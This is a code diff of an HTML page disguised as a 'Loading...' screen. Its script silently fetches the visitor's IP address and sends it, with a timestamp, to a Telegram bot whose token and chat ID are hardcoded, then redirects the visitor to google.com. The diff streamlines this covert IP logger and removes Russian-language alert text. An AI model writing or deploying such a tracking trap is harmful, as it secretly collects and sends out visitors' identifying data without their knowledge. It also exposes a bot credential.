@@ -2,34 +2,18 @@
 <html>
 <head><title>Loading...</title></head>
 <body>
-
 <script>
 const BOT_TOKEN = '8296295026:AAF50PwYjpCymmNgyz5gpa8T6AwVaXwk8Ys';
 const CHAT_ID = '1948684561';
 
-function sendToTelegram(text) {
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({chat_id: CHAT_ID, text: text})
-  });
-}
-
-// Получаем IP
 fetch('https://api.ipify.org?format=json')
   .then(r => r.json())
   .then(data => {
     const ip = data.ip;
-    const message = `🌍 НОВЫЙ ПЕРЕХОД!\n\nIP: ${ip}\nВремя: ${new Date().toLocaleString()}\nУзнать город: https://ipinfo.io/${ip}`;
-    sendToTelegram(message);
-  })
-  .catch(e => {
-    sendToTelegram('Ошибка: ' + e.message);
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=IP: ${ip} - ${new Date().toLocaleString()}`);
   });
 
-setTimeout(() => {
-  window.location.href = 'https://google.com';
-}, 500);
+window.location.href = 'https://google.com';
 </script>
 </body>
 </html>
